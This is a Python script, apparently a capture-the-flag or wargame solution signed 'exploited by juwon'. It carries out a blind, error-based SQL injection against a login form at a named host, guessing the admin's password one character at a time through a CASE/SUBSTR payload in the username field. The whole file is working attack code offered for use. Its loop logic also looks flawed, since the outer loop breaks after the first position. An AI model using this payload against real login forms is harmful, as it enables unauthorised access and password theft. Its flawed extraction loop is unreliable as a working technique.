import requests
import string

url = "http://kairoshk.ddns.net:9090/level3"

charset = string.ascii_lowercase + string.ascii_uppercase + string.digits

password = ""
max_length = 256

for position in range(1, max_length + 1):
    for char in charset:
        payload = {
            "username": f"admin' AND 1=(SELECT CASE WHEN SUBSTR((SELECT password FROM users WHERE username='admin'), {position}, 1)='{char}' THEN 1 ELSE (select 1/0) END)--",
            "password": ""
        }

        response = requests.post(url, data=payload)
        required_char = 'admin'
        if 'Results:' in response.text:
            index = response.text.index(required_char)
            ei = response.text.find(")")
            if index != -1:
                print(f"31337 Won : {response.text[index:ei].replace('&#39;', "")}")
            else:
                print('패치당했네;;')
            break
    break

# exploited by juwon